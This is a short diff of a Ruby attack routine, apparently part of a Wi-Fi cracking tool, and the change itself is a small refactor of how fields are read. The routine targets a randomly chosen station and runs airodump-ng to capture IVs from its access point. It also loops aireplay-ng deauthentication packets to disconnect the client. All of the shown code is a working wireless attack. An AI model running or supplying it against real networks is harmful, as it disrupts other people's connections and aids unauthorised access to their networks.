@@ -10,13 +10,13 @@ def aireplay_runner stations = Array.new
 	
 	r = stations.sample
 	
-	p = IO.popen("sudo airodump-ng mon0 --bssid #{r.get("bssid")} -c 10 -w replay --ivs")
+	p = IO.popen("sudo airodump-ng mon0 --bssid #{r.bssid} -c 10 -w replay --ivs")
 
 
 	fork do 
 		sleep(2)
 		3.times do
-			system("sudo aireplay-ng -0 1 -a #{r.get("bssid")} -c #{r.get("stmac")} mon0")
+			system("sudo aireplay-ng -0 1 -a #{r.bssid} -c #{r.stmac} mon0")
 			sleep(5)
 		end
 	end
